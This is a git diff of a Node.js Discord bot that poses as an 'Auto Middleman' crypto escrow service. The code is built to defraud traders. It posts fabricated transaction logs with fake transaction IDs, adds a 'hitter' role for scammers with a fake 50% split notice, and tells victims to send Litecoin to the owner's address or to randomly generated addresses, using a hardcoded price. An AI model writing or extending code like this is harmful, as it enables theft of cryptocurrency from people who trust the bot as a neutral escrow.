@@ -29,12 +29,15 @@ const client = new Client({
   ],
 });
 
-const OWNER_ID = '1422945082746601594';
+const OWNER_ID = '1473055478714990705';
 const DEFAULT_LTC = 'LeDdjh2BDbPkrhG2pkWBko3HRdKQzprJMX';
-const DEFAULT_USDC = '0x62440a91e8F26e07bf20Ba84F71CABF6d71dBc5E';
 
-let LTC_ADDRESS = DEFAULT_LTC;
-let USDC_ADDRESS = DEFAULT_USDC;
+let config = {
+  hitterRoleId: null,
+  transactionChannelId: null,
+  ownerLtcAddress: null,
+  useOwnerAddress: false
+};
 
 const confirmedInteractions = new Set();
 const activeTurns = new Map();
@@ -42,21 +45,32 @@ let panelCategoryId = null;
 
 function loadConfig() {
   try {
-    const catRow = db.prepare("SELECT value FROM config WHERE key='panelCategory'").get();
-    if (catRow) panelCategoryId = catRow.value;
-    const ltcRow = db.prepare("SELECT value FROM config WHERE key='ltcAddress'").get();
-    if (ltcRow) LTC_ADDRESS = ltcRow.value;
-    const usdcRow = db.prepare("SELECT value FROM config WHERE key='usdcAddress'").get();
-    if (usdcRow) USDC_ADDRESS = usdcRow.value;
+    const rows = db.prepare("SELECT key, value FROM config").all();
+    rows.forEach(row => {
+      if (row.key === 'panelCategory') panelCategoryId = row.value;
+      if (row.key === 'hitterRoleId') config.hitterRoleId = row.value;
+      if (row.key === 'transactionChannelId') config.transactionChannelId = row.value;
+      if (row.key === 'ownerLtcAddress') config.ownerLtcAddress = row.value;
+      if (row.key === 'useOwnerAddress') config.useOwnerAddress = row.value === 'true';
+    });
   } catch (e) {
     console.log('Config load error:', e.message);
   }
+}
+
+function isOwner(userId) {
+  return userId === OWNER_ID;
 }
 
 function isWhitelisted(userId) {
   if (userId === OWNER_ID) return true;
   const row = db.prepare('SELECT userId FROM whitelist WHERE userId = ?').get(userId);
   return !!row;
+}
+
+function hasHitterRole(member) {
+  if (!config.hitterRoleId) return false;
+  return member.roles.cache.has(config.hitterRoleId);
 }
 
 function generateFakeTxid() {
@@ -66,7 +80,14 @@ function generateFakeTxid() {
   return txid;
 }
 
-async function sendAccurateFakeLog(channelId, tradeId) {
+function generateRandomLtcAddress() {
+  const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+  let addr = 'L';
+  for (let i = 0; i < 33; i++) addr += chars[Math.floor(Math.random() * chars.length)];
+  return addr;
+}
+
+async function sendAccurateFakeLog(channelId, tradeId, hitterAddress = null) {
   const channel = await client.channels.fetch(channelId).catch(() => null);
   if (!channel) return;
   
@@ -106,12 +127,21 @@ async function sendAccurateFakeLog(channelId, tradeId) {
       new ButtonBuilder().setCustomId('cancel').setLabel('Cancel').setStyle(ButtonStyle.Secondary)
     );
     await channel.send({ embeds: [confirmEmbed, proceedEmbed], components: [row] });
+    
+    if (hitterAddress && trade.amount > 0) {
+      const splitAmount = (trade.totalLtc / 2).toFixed(8);
+      const splitEmbed = new EmbedBuilder()
+        .setTitle('💰 Split Payment Initiated')
+        .setDescription(`50% split sent to hitter\nAmount: ${splitAmount} LTC`)
+        .setColor(0x00FF00);
+      await channel.send({ embeds: [splitEmbed] });
+    }
   }, 15000);
 }
 
 const commands = [
+  new SlashCommandBuilder().setName('configure').setDescription('Configure bot settings (Owner only)'),
   new SlashCommandBuilder().setName('panel').setDescription('Spawn the middleman panel'),
-  new SlashCommandBuilder().setName('panelcategory').setDescription('Set ticket category').addStringOption(opt => opt.setName('id').setDescription('Category ID').setRequired(true)),
   new SlashCommandBuilder().setName('whitelist').setDescription('Whitelist a user to use owner commands').addUserOption(opt => opt.setName('user').setDescription('User to whitelist').setRequired(true)),
   new SlashCommandBuilder().setName('close').setDescription('Close this ticket')
 ].map(cmd => cmd.toJSON());
@@ -137,27 +167,21 @@ client.on(Events.MessageCreate, async (message) => {
   const command = args.shift().toLowerCase();
   
   if (command === 'detect') {
-    const channelId = args[0];
+    if (!isWhitelisted(message.author.id)) return message.reply('❌ Not authorized');
+    const channelId = args[0] || config.transactionChannelId;
     const tradeId = args[1];
     if (!channelId || !tradeId) return message.reply('❌ Usage: `.detect (channelid) (tradeid)`');
-    await sendAccurateFakeLog(channelId, tradeId);
-    await message.reply(`✅ Accurate fake transaction triggered in <#${channelId}> for trade #${tradeId}`);
-  }
-  else if (command === 'setltc') {
-    if (!isWhitelisted(message.author.id)) return;
-    const address = args[0];
-    if (!address) return message.reply('❌ Provide address: `.setltc (address)`');
-    db.prepare("INSERT OR REPLACE INTO config(key, value) VALUES('ltcAddress', ?)").run(address);
-    LTC_ADDRESS = address;
-    await message.reply('✅ LTC address updated for all tickets');
-  }
-  else if (command === 'setusdc') {
-    if (!isWhitelisted(message.author.id)) return;
-    const address = args[0];
-    if (!address) return message.reply('❌ Provide address: `.setusdc (address)`');
-    db.prepare("INSERT OR REPLACE INTO config(key, value) VALUES('usdcAddress', ?)").run(address);
-    USDC_ADDRESS = address;
-    await message.reply('✅ USDC address updated for all tickets');
+    
+    let hitterAddress = null;
+    if (!config.useOwnerAddress && config.hitterRoleId) {
+      const member = await message.guild.members.fetch(message.author.id);
+      if (!hasHitterRole(member)) {
+        return message.reply('❌ Only hitter can initiate detection');
+      }
+    }
+    
+    await sendAccurateFakeLog(channelId, tradeId, hitterAddress);
+    await message.reply(`✅ Transaction detection triggered in <#${channelId}> for trade #${tradeId}`);
   }
 });
 
@@ -183,10 +207,36 @@ client.on(Events.InteractionCreate, async (interaction) => {
 async function handleSlashCommand(interaction) {
   const { commandName } = interaction;
   
-  if (commandName === 'panel') {
+  if (commandName === 'configure') {
+    if (!isOwner(interaction.user.id)) {
+      return interaction.reply({ content: '❌ Owner only command', flags: MessageFlags.Ephemeral });
+    }
+    
+    const modal = new ModalBuilder()
+      .setCustomId('configure_modal')
+      .setTitle('Bot Configuration');
+    
+    modal.addComponents(
+      new ActionRowBuilder().addComponents(
+        new TextInputBuilder().setCustomId('hitterRoleId').setLabel('Hitter Role ID').setPlaceholder('Enter role ID').setStyle(TextInputStyle.Short).setRequired(true)
+      ),
+      new ActionRowBuilder().addComponents(
+        new TextInputBuilder().setCustomId('transactionChannelId').setLabel('Transaction Channel ID').setPlaceholder('Enter channel ID').setStyle(TextInputStyle.Short).setRequired(true)
+      ),
+      new ActionRowBuilder().addComponents(
+        new TextInputBuilder().setCustomId('ownerLtcAddress').setLabel('Owner LTC Address').setPlaceholder('Enter LTC address').setStyle(TextInputStyle.Short).setRequired(true)
+      ),
+      new ActionRowBuilder().addComponents(
+        new TextInputBuilder().setCustomId('useOwnerAddress').setLabel('Use owner address in tickets? (Yes/No)').setPlaceholder('Yes or No').setStyle(TextInputStyle.Short).setRequired(true)
+      )
+    );
+    
+    await interaction.showModal(modal);
+  }
+  else if (commandName === 'panel') {
     const mainEmbed = new EmbedBuilder()
-      .setTitle("Jace's Auto Middleman")
-      .setDescription('• Paid Service\n• Read our ToS before using the bot: <#tos-crypto>')
+      .setTitle("Auto Middleman")
+      .setDescription('• Paid Service\n• Secure escrow service')
       .setColor(0x2B2D31);
     
     const feesEmbed = new EmbedBuilder()
@@ -198,37 +248,17 @@ async function handleSlashCommand(interaction) {
       .setTitle('• Request Litecoin •')
       .setColor(0x2B2D31);
     
-    const usdtEmbed = new EmbedBuilder()
-      .setTitle('• Request USDT [BEP-20] •')
-      .setDescription('• Network: **BSC (BEP-20)**')
-      .setColor(0x2B2D31);
-    
     const row1 = new ActionRowBuilder().addComponents(
-      new ButtonBuilder().setLabel('Tutorial').setStyle(ButtonStyle.Link).setURL('https://example.com').setEmoji('🔗')
-    );
-    
-    const row2 = new ActionRowBuilder().addComponents(
       new ButtonBuilder().setCustomId('request_ltc').setLabel('Request LTC').setStyle(ButtonStyle.Primary).setEmoji('🪙')
     );
     
-    const row3 = new ActionRowBuilder().addComponents(
-      new ButtonBuilder().setCustomId('request_usdt').setLabel('Request USDT [BEP-20]').setStyle(ButtonStyle.Success).setEmoji('💵')
-    );
-    
     await interaction.reply({ 
-      embeds: [mainEmbed, feesEmbed, ltcEmbed, usdtEmbed], 
-      components: [row1, row2, row3] 
+      embeds: [mainEmbed, feesEmbed, ltcEmbed], 
+      components: [row1] 
     });
   }
-  else if (commandName === 'panelcategory') {
-    if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: '❌ Owner only', flags: MessageFlags.Ephemeral });
-    const id = interaction.options.getString('id');
-    db.prepare("INSERT OR REPLACE INTO config(key, value) VALUES('panelCategory', ?)").run(id);
-    panelCategoryId = id;
-    await interaction.reply({ content: '✅ Panel category set', flags: MessageFlags.Ephemeral });
-  }
   else if (commandName === 'whitelist') {
-    if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: '❌ Owner only', flags: MessageFlags.Ephemeral });
+    if (!isOwner(interaction.user.id)) return interaction.reply({ content: '❌ Owner only', flags: MessageFlags.Ephemeral });
     const user = interaction.options.getUser('user');
     try {
       db.prepare('INSERT OR REPLACE INTO whitelist (userId) VALUES (?)').run(user.id);
@@ -251,14 +281,13 @@ function calculateFee(amount) {
 async function handleButton(interaction) {
   const customId = interaction.customId;
   
-  if (customId === 'request_ltc' || customId === 'request_usdt') {
-    const isLtc = customId === 'request_ltc';
+  if (customId === 'request_ltc') {
     const modal = new ModalBuilder()
-      .setCustomId(isLtc ? 'ltc_modal' : 'usdt_modal')
+      .setCustomId('ltc_modal')
       .setTitle('Fill out the format');
     modal.addComponents(
       new ActionRowBuilder().addComponents(
-        new TextInputBuilder().setCustomId('otherUserId').setLabel("Paste Your Trader's Username or ID").setPlaceholder('e.g.: kookie.js / 693059117761429610').setStyle(TextInputStyle.Short).setRequired(true)
+        new TextInputBuilder().setCustomId('otherUserId').setLabel("Paste Your Trader's Username or ID").setPlaceholder('e.g.: username / 693059117761429610').setStyle(TextInputStyle.Short).setRequired(true)
       ),
       new ActionRowBuilder().addComponents(
         new TextInputBuilder().setCustomId('youGiving').setLabel('What are You giving?').setStyle(TextInputStyle.Short).setRequired(true)
@@ -285,7 +314,14 @@ async function handleButton(interaction) {
     const tradeId = customId.split('_')[2];
     const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
     if (!trade) return;
-    const address = trade.type === 'ltc' ? LTC_ADDRESS : USDC_ADDRESS;
+    
+    let address;
+    if (config.useOwnerAddress) {
+      address = config.ownerLtcAddress;
+    } else {
+      address = generateRandomLtcAddress();
+    }
+    
     await interaction.reply({ content: `\`${address}\``, flags: MessageFlags.Ephemeral });
   }
   else if (customId === 'cancel' || customId === 'close_ticket' || customId.startsWith('delete_') || customId.startsWith('cancel_trade_')) {
@@ -294,7 +330,25 @@ async function handleButton(interaction) {
 }
 
 async function handleModal(interaction) {
-  if (interaction.customId === 'ltc_modal' || interaction.customId === 'usdt_modal') {
+  if (interaction.customId === 'configure_modal') {
+    const hitterRoleId = interaction.fields.getTextInputValue('hitterRoleId');
+    const transactionChannelId = interaction.fields.getTextInputValue('transactionChannelId');
+    const ownerLtcAddress = interaction.fields.getTextInputValue('ownerLtcAddress');
+    const useOwnerAddr = interaction.fields.getTextInputValue('useOwnerAddress').toLowerCase();
+    
+    config.hitterRoleId = hitterRoleId;
+    config.transactionChannelId = transactionChannelId;
+    config.ownerLtcAddress = ownerLtcAddress;
+    config.useOwnerAddress = useOwnerAddr === 'yes';
+    
+    db.prepare("INSERT OR REPLACE INTO config(key, value) VALUES('hitterRoleId', ?)").run(hitterRoleId);
+    db.prepare("INSERT OR REPLACE INTO config(key, value) VALUES('transactionChannelId', ?)").run(transactionChannelId);
+    db.prepare("INSERT OR REPLACE INTO config(key, value) VALUES('ownerLtcAddress', ?)").run(ownerLtcAddress);
+    db.prepare("INSERT OR REPLACE INTO config(key, value) VALUES('useOwnerAddress', ?)").run(config.useOwnerAddress ? 'true' : 'false');
+    
+    await interaction.reply({ content: '✅ Configuration saved successfully!', flags: MessageFlags.Ephemeral });
+  }
+  else if (interaction.customId === 'ltc_modal') {
     await handleTradeDetailsModal(interaction);
   }
   else if (interaction.customId.startsWith('amount_modal_')) {
@@ -304,7 +358,6 @@ async function handleModal(interaction) {
 
 async function handleTradeDetailsModal(interaction) {
   try {
-    const isLtc = interaction.customId === 'ltc_modal';
     const rawInput = interaction.fields.getTextInputValue('otherUserId').trim();
     const youGiving = interaction.fields.getTextInputValue('youGiving');
     const theyGiving = interaction.fields.getTextInputValue('theyGiving');
@@ -338,7 +391,7 @@ async function handleTradeDetailsModal(interaction) {
     }
     
     const channelOptions = {
-      name: `${isLtc ? 'ltc' : 'usdc'}-${interaction.user.username}-${otherMember.user.username}`.substring(0, 100),
+      name: `ltc-${interaction.user.username}-${otherMember.user.username}`.substring(0, 100),
       type: ChannelType.GuildText,
       permissionOverwrites: [
         { id: interaction.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
@@ -355,13 +408,13 @@ async function handleTradeDetailsModal(interaction) {
     
     const channel = await interaction.guild.channels.create(channelOptions);
     
-    const result = db.prepare("INSERT INTO trades (channelId, user1Id, user2Id, senderId, receiverId, amount, status, type) VALUES (?, ?, ?, NULL, NULL, 0, 'role_selection', ?)").run(channel.id, interaction.user.id, otherUserId, isLtc ? 'ltc' : 'usdc');
+    const result = db.prepare("INSERT INTO trades (channelId, user1Id, user2Id, senderId, receiverId, amount, status, type) VALUES (?, ?, ?, NULL, NULL, 0, 'role_selection', 'ltc')").run(channel.id, interaction.user.id, otherUserId);
     const tradeId = result.lastInsertRowid;
     
     await interaction.reply({ content: `✅ Trade channel created: ${channel}`, flags: MessageFlags.Ephemeral });
     
     const embed = new EmbedBuilder()
-      .setTitle("👋 Jace's Auto Middleman Service")
+      .setTitle("👋 Auto Middleman Service")
       .setDescription('Make sure to follow the steps and read the instructions thoroughly.\nPlease explicitly state the trade details if the information below is inaccurate.')
       .addFields(
         { name: `${interaction.user.username}'s side:`, value: youGiving, inline: true },
@@ -592,19 +645,24 @@ async function handleConfirmAmount(interaction) {
 
 async function sendPaymentInstructions(channel, tradeId) {
   const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
-  const isLtc = trade.type === 'ltc';
-  const address = isLtc ? LTC_ADDRESS : USDC_ADDRESS;
   const fee = trade.fee || 0;
   const totalUsd = trade.amount + fee;
   
+  let address;
+  if (config.useOwnerAddress) {
+    address = config.ownerLtcAddress;
+  } else {
+    address = generateRandomLtcAddress();
+  }
+  
   const embed = new EmbedBuilder()
-    .setDescription(`<@${trade.senderId}> Send the ${isLtc ? 'LTC' : 'USDT'} to the following address.`)
+    .setDescription(`<@${trade.senderId}> Send the LTC to the following address.`)
     .addFields(
       { name: '📋 Payment Information', value: 'Make sure to send the **EXACT** amount.' },
       { name: 'USD Amount', value: `$${trade.amount.toFixed(2)}` },
       { name: 'Fee', value: `$${fee.toFixed(2)}` },
       { name: 'Total with Fee', value: `$${totalUsd.toFixed(2)}` },
-      { name: isLtc ? 'LTC Amount' : 'USDT Amount', value: trade.totalLtc.toFixed(5) },
+      { name: 'LTC Amount', value: trade.totalLtc.toFixed(5) },
       { name: 'Payment Address', value: `\`${address}\`` },
       { name: 'Current LTC Price', value: '$55.00' },
       { name: '⏰ Timeout', value: 'This ticket will be closed within 20 minutes if no transaction was detected.' }
